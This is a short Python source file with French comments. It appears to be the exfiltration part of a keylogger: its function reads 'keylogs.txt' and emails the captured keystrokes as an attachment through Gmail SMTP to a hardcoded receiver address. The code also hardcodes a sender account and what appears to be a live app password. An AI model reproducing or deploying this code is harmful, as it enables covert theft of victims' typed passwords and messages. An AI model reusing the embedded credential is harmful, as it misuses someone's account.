import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def sendMail():
    #Configuration pour l'envoi de mail
    port=465
    smtp_server="smtp.gmail.com"
    sender_email="amazonoussama640@gmail.com"
    receiver_email="oussamaau123@gmail.com"
    password="tdcf hoql nrco flxv"
    objet="Fichier du keylog"
    corps="Envoi du fichier keylog"

    #Création d'un mail multipart
    message=MIMEMultipart()
    message["From"]=sender_email
    message["To"]=receiver_email
    message["Subject"]=objet

    message.attach(MIMEText(corps,"plain"))

    filename="keylogs.txt"

    with open(filename,"rb") as attachment:
        part=MIMEBase("application","octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Le mail a été envoyé")

